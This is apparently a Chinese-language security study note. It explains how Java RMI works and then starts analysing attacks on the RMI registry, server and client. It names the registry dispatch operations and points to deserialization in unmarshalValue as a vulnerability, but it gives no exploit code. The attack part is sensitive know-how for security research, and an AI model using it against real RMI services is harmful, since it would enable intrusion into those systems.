RMI机制分析

什么是RMI

Java RMI（Remote Method Invocation，远程方法调用）是一种用于在分布式系统中进行远程通信的机制。它允许一个Java虚拟机（JVM）上的对象调用另一个JVM上的对象方法，就像调用本地方法一样。

RMI 的核心概念

  1. 远程对象：存在于远程JVM中的对象，客户端可以通过网络调用其方法。
  2. 存根（Stub）和骨架（Skeleton）：
    • Stub：客户端的代理，负责将调用请求发送到远程对象。
    • Skeleton：服务器端的代理，负责接收请求并调用实际对象的方法。
  3. RMI Registry：一个简单的命名服务，客户端通过它查找远程对象的引用。

RMI 的工作流程

  1. 定义远程接口：接口必须继承 <font style="color:rgb(64, 64, 64);">java.rmi.Remote</font>，方法需声明抛出 <font style="color:rgb(64, 64, 64);">RemoteException</font>。
  2. 实现远程接口：实现类通常继承 <font style="color:rgb(64, 64, 64);">UnicastRemoteObject</font>。
  3. 启动RMI Registry：使用 <font style="color:rgb(64, 64, 64);">rmiregistry</font> 命令启动注册表。
  4. 注册远程对象：将远程对象绑定到RMI Registry。
  5. 客户端查找远程对象：通过RMI Registry获取远程对象的引用并调用方法。

RMI 的用途

  1. 分布式计算：将任务分布到多台机器上执行。
  2. 远程服务调用：客户端调用远程服务器上的服务。
  3. 负载均衡：通过远程调用将请求分发到不同服务器。
  4. 模块化设计：将系统拆分为多个独立模块，部署在不同服务器上。

攻击方式

RMI通信的原理以后再深究，先来看看RMI的攻击方式

根据 RMI 的部分，有这么一些攻击方式

  • 攻击注册中心
  • 攻击服务端
  • 攻击客户端

我们一个一个讲

攻击注册中心

我们与注册中心进行交互可以使用如下几种方式：

  • list
  • bind
  • rebind
  • unbind
  • lookup

这些方法的原型位于RegistryImpl_Skel#dispatch中的switch语句中，若存在对传入的对象使用readObject方法，则可利用，下面是case与方法的对应

  • 0 —– bind
  • 1 —– list
  • 2 —– lookup
  • 3 —– rebind
  • 4 —– unbind

漏洞点unmarshalValue

对于客户端远程调用服务端的函数时，提交参数的方法是通过序列化进行传输，所以在服务端就是通过unmarshalValue来读取反序列后的参数
